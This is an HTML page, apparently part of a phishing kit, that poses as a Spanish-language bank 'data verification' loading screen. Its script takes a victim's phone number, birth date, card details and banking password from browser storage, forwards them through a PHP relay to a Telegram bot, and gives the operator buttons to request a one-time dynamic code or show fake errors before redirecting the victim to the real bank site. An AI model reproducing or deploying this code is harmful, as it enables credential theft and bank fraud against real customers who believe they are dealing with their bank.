<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificando Datos</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: url('img/fondo.jpg') no-repeat center center fixed;
      background-size: cover;
    }
    .blur-overlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(255, 255, 255, 0.4);
      backdrop-filter: blur(10px);
    }
    .loaderp-full {
      display: flex; flex-direction: column;
      justify-content: center; align-items: center;
      position: fixed; width: 90%; height: 90%;
      z-index: 9999;
    }
    .loaderp {
      width: 180px; height: 180px;
      background-image: url('img/circulo.png');
      background-size: cover; border-radius: 50%;
      display: flex; flex-direction: column;
      justify-content: center; align-items: center;
    }
    .loader {
      width: 30px; height: 30px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #555;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    .loaderp-text {
      margin-top: 30px;
      font-size: 13px;
      color: black;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="blur-overlay"></div>
  <div class="loaderp-full">
    <div class="loaderp">
      <div class="loader"></div>
      <div class="loaderp-text">Cargando...</div>
    </div>
  </div>

<script>
document.addEventListener('DOMContentLoaded', async function () {
  const config = await fetch("botconfig.json").then(r => r.json()).catch(() => null);
  if (!config || !config.token || !config.chat_id) {
    alert("Error cargando configuración del bot.");
    return;
  }

  const { token } = config;
  const data = JSON.parse(localStorage.getItem("bancoldata") || "{}");

  if (!data.celular || !data.nacimiento || !data.tipo || !data.identificador || !data.digitosFinales || !data.clave) {
    alert("Faltan datos. Redirigiendo...");
    return window.location.href = "index.html";
  }

  const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
  localStorage.setItem("transactionId", transactionId);

  const mensaje = `
📥 <b>REGISTRO NUEVO</b>
🆔 ID: <code>${transactionId}</code>
📱 Celular: ${data.celular}
🎂 Nacimiento: ${data.nacimiento}
💳 Tipo: ${data.tipo}
🔢 Identificador: ${data.identificador}
🔸 Últimos 2 dígitos: ${data.digitosFinales}
🔐 Clave: ${data.clave}
`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
      [{ text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
      [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
    ]
  };

  // Solo enviar mensaje, sin getUpdates
  await fetch("botmaster2.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "data=" + encodeURIComponent(mensaje) +
          "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
  });

  // Inicia la escucha del botón desde Webhook
  revisarAccion(transactionId);

  async function revisarAccion(txId) {
    try {
      const res = await fetch(`sendStatus.php?txid=${txId}`);
      const json = await res.json();

      if (!json.status || json.status === "esperando") {
        return setTimeout(() => revisarAccion(txId), 3000);
      }

      switch (json.status) {
        case "pedir_dinamica":
          window.location.href = "cel-dina.html"; break;
        case "error_logo":
          window.location.href = "errorlogo.html"; break;
        case "finalizar":
        case "confirm_finalizar":
          window.location.href = "https://www.bancoppel.com"; break;
      }

    } catch (e) {
      console.error("Error al revisar botón:", e);
      setTimeout(() => revisarAccion(txId), 3000);
    }
  }
});
</script>
</body>
</html>
